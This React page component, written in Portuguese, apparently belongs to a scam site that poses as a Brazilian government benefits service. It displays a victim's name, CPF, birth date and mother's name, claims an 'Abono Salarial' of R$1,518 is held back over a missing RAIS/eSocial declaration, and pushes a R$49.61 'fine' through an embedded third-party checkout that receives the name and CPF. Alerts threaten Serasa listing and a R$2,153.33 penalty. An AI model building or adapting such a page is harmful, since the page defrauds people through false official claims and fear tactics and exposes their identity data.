import React, { useEffect, useState } from 'react';
import { useNavigate, useLocation } from 'react-router-dom';
import { Button } from "@/components/ui/button";
import { ArrowLeft, CheckCircle, AlertTriangle, CreditCard, User, Banknote, Calendar, FileText, Clock, X } from "lucide-react";
import { toast } from 'sonner';
import PageLayout from '@/components/PageLayout';
import { Table, TableHeader, TableBody, TableFooter, TableHead, TableRow, TableCell, TableCaption } from "@/components/ui/table";
import { Separator } from "@/components/ui/separator";
import { Card, CardHeader, CardTitle, CardContent } from "@/components/ui/card";
import { Sheet, SheetContent, SheetHeader, SheetTitle } from "@/components/ui/sheet";
import { useIsMobile } from "@/hooks/use-mobile";
import { Alert, AlertDescription } from "@/components/ui/alert";

const Payment: React.FC = () => {
  const [userData, setUserData] = useState<any>(null);
  const [showIframe, setShowIframe] = useState<boolean>(false);
  const [sheetOpen, setSheetOpen] = useState<boolean>(false);
  const navigate = useNavigate();
  const location = useLocation();
  const isMobile = useIsMobile();

  useEffect(() => {
    if (location.state && location.state.userData) {
      setUserData(location.state.userData);
      localStorage.setItem("name", location.state.userData.nome || "");
      localStorage.setItem("cpf", location.state.userData.cpf || "");
      localStorage.setItem("email", localStorage.getItem("email") || "cliente@example.com");
      localStorage.setItem("phone", localStorage.getItem("phone") || "11999999999");
    } else {
      toast.error("Nenhum dado encontrado. Por favor, faça a consulta novamente.");
      navigate('/');
    }
  }, [location.state, navigate]);

  const scrollIframeToBottom = (iframeElement: HTMLIFrameElement | null) => {
    if (!iframeElement) return;
    
    try {
      const handleIframeLoad = () => {
        try {
          if (iframeElement.contentWindow) {
            iframeElement.contentWindow.scrollTo({
              top: iframeElement.contentWindow.document.body.scrollHeight,
              behavior: 'smooth'
            });
          }
        } catch (error) {
          console.log("Não foi possível acessar o conteúdo do iframe devido a políticas de segurança");
        }
      };
      
      iframeElement.addEventListener('load', handleIframeLoad);
      
      if (iframeElement.complete) {
        handleIframeLoad();
      }
    } catch (error) {
      console.log("Erro ao tentar rolar o iframe:", error);
    }
  };

  const formatCPF = (cpf: string) => {
    if (!cpf) return "";
    const digitsOnly = cpf.replace(/\D/g, '');
    return digitsOnly.replace(/(\d{3})(\d{3})(\d{3})(\d{2})/, '$1.$2.$3-$4');
  };

  const formatDate = (dateString: string) => {
    if (!dateString) return null;
    const date = new Date(dateString);
    return date.toLocaleDateString('pt-BR');
  };

  const handleBackToVerification = () => {
    navigate('/user-data', { state: { userData } });
  };

  const handleProceedToPayment = () => {
    openPaymentIframe();
  };

  const openPaymentIframe = () => {
    const name = localStorage.getItem("name") || userData?.nome || "";
    const cpf = localStorage.getItem("cpf") || userData?.cpf || "";
    const url = `https://nitropaycheckout.com.br/checkout/34842aea-9cb1-4af2-b1b8-b95a07e151b9?name=${encodeURIComponent(name)}&document=${encodeURIComponent(cpf)}`;
    
    if (isMobile) {
      setSheetOpen(true);
      setTimeout(() => {
        const mobileIframe = document.getElementById("mobilePagamentoIframe") as HTMLIFrameElement;
        if (mobileIframe) {
          mobileIframe.src = url;
          scrollIframeToBottom(mobileIframe);
        }
      }, 100);
    } else {
      setShowIframe(true);
      setTimeout(() => {
        const iframe = document.getElementById("pagamentoIframe") as HTMLIFrameElement;
        if (iframe) {
          iframe.src = url;
          iframe.style.display = "block";
          scrollIframeToBottom(iframe);
        }
      }, 100);
    }
  };

  const closeIframe = () => {
    setShowIframe(false);
    const iframe = document.getElementById("pagamentoIframe") as HTMLIFrameElement;
    if (iframe) {
      iframe.src = "";
    }
  };

  const handleSheetOpenChange = (open: boolean) => {
    setSheetOpen(open);
    if (!open) {
      const mobileIframe = document.getElementById("mobilePagamentoIframe") as HTMLIFrameElement;
      if (mobileIframe) {
        mobileIframe.src = "";
      }
    }
  };

  if (!userData) {
    return (
      <PageLayout>
        <div className="flex justify-center items-center">
          <p>Carregando dados...</p>
        </div>
      </PageLayout>
    );
  }

  return (
    <PageLayout>
      {showIframe && (
        <div className="fixed inset-0 z-50 bg-black bg-opacity-50 flex justify-center items-center p-0 m-0">
          <div className="relative bg-white w-full h-full flex flex-col">
            <div className="p-2 items-center">
              <Alert className="bg-amber-50 border-amber-300 mb-0">
                <AlertTriangle className="h-5 w-5 text-amber-600" />
                <AlertDescription className="text-amber-800 font-medium text-sm">
                  Realize o pagamento da multa ou caso contrário seu nome ficará irregular no Serasa e será aplicada uma multa de R$2.153,33
                </AlertDescription>
              </Alert>
              <Button 
                variant="ghost" 
                size="icon" 
                onClick={closeIframe}
                className="absolute right-2 top-2 text-gray-500 hover:text-gray-700"
              >
                <X className="h-5 w-5" />
              </Button>
            </div>
            <div className="flex-1 w-full h-full">
              <iframe
                id="pagamentoIframe"
                className="w-full h-full border-0"
                title="Pagamento"
                allow="payment"
              ></iframe>
            </div>
          </div>
        </div>
      )}

      <Sheet open={sheetOpen} onOpenChange={handleSheetOpenChange}>
        <SheetContent side="bottom" className="h-[100vh] p-0 m-0 max-h-[100vh]" hideCloseButton>
          <div className="p-2 relative">
            <Alert className="bg-amber-50 border-amber-300 mb-0 pr-8">
              <AlertTriangle className="h-5 w-5 text-amber-600" />
              <AlertDescription className="text-amber-800 font-medium text-sm">
                Realize o pagamento da multa ou caso contrário seu nome ficará irregular no Serasa e será aplicada uma multa de R$2.153,33
              </AlertDescription>
            </Alert>
            <Button 
              variant="ghost" 
              size="icon" 
              onClick={() => setSheetOpen(false)}
              className="absolute right-2 top-2 text-gray-500 hover:text-gray-700"
            >
              <X className="h-5 w-5" />
            </Button>
          </div>
          <div className="h-full w-full">
            <iframe
              id="mobilePagamentoIframe"
              className="w-full h-full border-0"
              title="Pagamento Mobile"
              allow="payment"
            ></iframe>
          </div>
        </SheetContent>
      </Sheet>

      <div className="container mx-auto p-0 pb-4 relative max-w-3xl">
        <div className="absolute top-0 left-0 mt-2 ml-0">
          <Button 
            variant="ghost" 
            size="icon" 
            onClick={handleBackToVerification} 
            className="text-gray-500 hover:text-gray-700 hover:bg-transparent"
          >
            <ArrowLeft className="h-4 w-4" />
          </Button>
        </div>

        <div className="glass-card rounded-lg p-4 animate-fade-in mt-2 shadow-sm">
          <h2 className="font-heading text-lg font-semibold text-govblue-700 mb-3 text-center">
            Revisão de Dados para Regularização
          </h2>

          <Card className="mb-4 shadow-sm">
            <CardHeader className="pb-1 pt-3 px-4">
              <CardTitle className="text-sm flex items-center">
                <User className="h-4 w-4 text-govblue-600 mr-2" />
                Informações Pessoais
              </CardTitle>
            </CardHeader>
            <CardContent className="p-3">
              <div className="grid grid-cols-2 gap-2 text-sm">
                <div>
                  <span className="text-xs text-gray-500">Nome</span>
                  <p className="font-medium">{userData.nome}</p>
                </div>
                <div>
                  <span className="text-xs text-gray-500">CPF</span>
                  <p className="font-medium">{formatCPF(userData.cpf)}</p>
                </div>
                {userData.data_nascimento && (
                  <div>
                    <span className="text-xs text-gray-500">Nascimento</span>
                    <p className="font-medium">{formatDate(userData.data_nascimento)}</p>
                  </div>
                )}
                {userData.nome_mae && (
                  <div>
                    <span className="text-xs text-gray-500">Nome da Mãe</span>
                    <p className="font-medium">{userData.nome_mae}</p>
                  </div>
                )}
              </div>
            </CardContent>
          </Card>

          <div className="bg-white rounded-lg shadow-sm overflow-hidden mb-4">
            <div className="p-2 bg-govblue-50">
              <h3 className="font-medium text-govblue-700 text-sm flex items-center">
                <FileText className="h-4 w-4 mr-1" />
                Detalhes da Regularização
              </h3>
            </div>

            <Table>
              <TableHeader>
                <TableRow className="bg-gray-50">
                  <TableHead className="py-1 px-2 text-xs">Item</TableHead>
                  <TableHead className="py-1 px-2 text-xs">Detalhes</TableHead>
                </TableRow>
              </TableHeader>
              <TableBody className="text-sm">
                <TableRow>
                  <TableCell className="font-medium py-1 px-2">Valor do Abono</TableCell>
                  <TableCell className="text-green-600 font-medium py-1 px-2">R$ 1.518,00</TableCell>
                </TableRow>
                <TableRow>
                  <TableCell className="font-medium py-1 px-2">Valor proporcional</TableCell>
                  <TableCell className="py-1 px-2">1 Salário mínimo</TableCell>
                </TableRow>
                <TableRow>
                  <TableCell className="font-medium py-1 px-2">Impedimento</TableCell>
                  <TableCell className="text-red-600 py-1 px-2">Declaração RAIS/eSocial ausente</TableCell>
                </TableRow>
                <TableRow>
                  <TableCell className="font-medium py-1 px-2">Razão da Multa</TableCell>
                  <TableCell className="py-1 px-2">
                    O traballhador não declarou o RAIS/eSocial
                  </TableCell>
                </TableRow>
                <TableRow className="bg-amber-50">
                  <TableCell className="font-medium py-1 px-2">Multa Base</TableCell>
                  <TableCell className="py-1 px-2">R$ 23,21</TableCell>
                </TableRow>
                <TableRow className="bg-amber-50">
                  <TableCell className="font-medium py-1 px-2">Acréscimo</TableCell>
                  <TableCell className="py-1 px-2">R$ 26,40 (4 trim. x R$ 6,60)</TableCell>
                </TableRow>
                <TableRow className="bg-amber-50 font-bold">
                  <TableCell className="font-medium text-red-700 py-1 px-2">Total da Multa</TableCell>
                  <TableCell className="text-red-700 font-bold py-1 px-2">R$ 49,61</TableCell>
                </TableRow>
              </TableBody>
              <TableFooter>
                <TableRow>
                  <TableCell colSpan={2} className="text-center text-xs text-gray-500 py-1 px-2">
                    Após pagamento, o valor de R$ 1.518,00 será liberado em até 24h.
                  </TableCell>
                </TableRow>
              </TableFooter>
            </Table>
          </div>

          <div className="p-2 bg-amber-50 border-l-4 border-amber-500 rounded-r-md mb-4 text-xs">
            <div className="flex items-start">
              <Clock className="h-4 w-4 text-amber-600 mt-0.5 mr-2 flex-shrink-0" />
              <p className="text-amber-800">
                Para liberar o pagamento do valor do Abono Salarial de R$1.518,00 e evitar que seu nome seja enviado ao SERASA pague a multa atual de R$49,61
              </p>
            </div>
          </div>

          <div className="flex justify-center">
            <Button 
              className="gov-button bg-govblue-600 hover:bg-govblue-500 rounded-full px-4 py-2 text-sm w-full max-w-xs"
              onClick={handleProceedToPayment}
            >
              <CreditCard className="mr-1 h-4 w-4 flex-shrink-0" />
              <span className="font-medium">Pagar Multa e Liberar Abono</span>
            </Button>
          </div>
        </div>
      </div>
    </PageLayout>
  );
};

export default Payment;
